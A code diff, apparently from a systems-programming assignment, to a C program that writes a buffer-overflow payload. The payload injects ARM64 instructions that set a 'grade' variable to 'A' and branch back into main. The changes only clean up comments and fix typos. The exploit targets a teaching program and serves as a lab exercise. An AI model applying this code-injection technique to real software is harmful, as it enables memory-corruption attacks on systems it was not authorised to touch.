@@ -31,7 +31,7 @@ strb w1, [x0]        *grade = 'A'
 b    0x40089c      jump to main+64 
 
 |0x420044  |0x44    |grade      | from memorymap
-|0x420058	|name[0 - 3]    | from mem oyrmap
+|0x420058 |name[0 - 3]    | from memorymap
 
 printf("%c is your grade.\n", grade);
 0x40089c <main+64>:  adrp    x0, 0x420000 <__libc_start_main@got.plt>
@@ -52,29 +52,32 @@ printf("%c is your grade.\n", grade);
     putc('\0', psFile);
     putc('\0', psFile);
 
-    /* bytes 4-7 executing adr x0, 0x420044 moving grade address to x0 
-    stores the instruction 4 bytes after name accordingly*/
+    /* bytes 4-7 execute adr x0, 0x420044, moving the grade address into x0.
+    This is the first injected instruction, so it sits 4 bytes after name. */
     uiInstr = MiniAssembler_adr(0, grade_addr, name_addr + 4);
     fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
-    /* bytes 8-11 executes mov w1, #0x41 which jsut stores the value for 'A' into w1*/
+    /* bytes 8-11 executes mov w1, #0x41 which just stores the value for 'A' into w1*/
     uiInstr = MiniAssembler_mov(1, 0x41);
     fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
     /* Bytes 12-15 executes
-    strb w1, [x0] whic store the byte 'A' at the address of grade */
+    strb w1, [x0] which stores the byte 'A' at the address of grade */
     uiInstr = MiniAssembler_strb(1, 0);
     fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
-    /* bytes 16-19 executes b 0x40089c which is the jump to the location of printf
-    so that the grade prints "A is your grade." stores the insturction 16 bytes after name since this 
-    is the 4th instruction
-    */
+    /* bytes 16-19 executes b 0x40089c, which jumps to main+64 (the
+    "%c is your grade.\n" printf block). This is the 4th injected
+    instruction so it sits 16 bytes after name. */
     uiInstr = MiniAssembler_b(printf_addr, name_addr + 16);
     fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
-    /* 28 null bytes. This acts as padding since the first 19 of the 18 store the name, null byte,
-     and the 16 inctruction bytes. the rest is stored in name but too long for printf*/
+    /* 28 null bytes of padding. The first 20 bytes of buf hold the
+    name (4 bytes including \0 and alignment padding) and the four
+    4-byte instructions (16 bytes); the remaining 28 bytes pad buf
+    out to its full 48-byte length. These bytes are also copied into
+    name[20..47] but never reach the "Thank you" printf because the
+    name string is already terminated by the \0 at name[2]. */
     for (i = 0; i < 28; i++) {
         putc(0x00, psFile);
     }
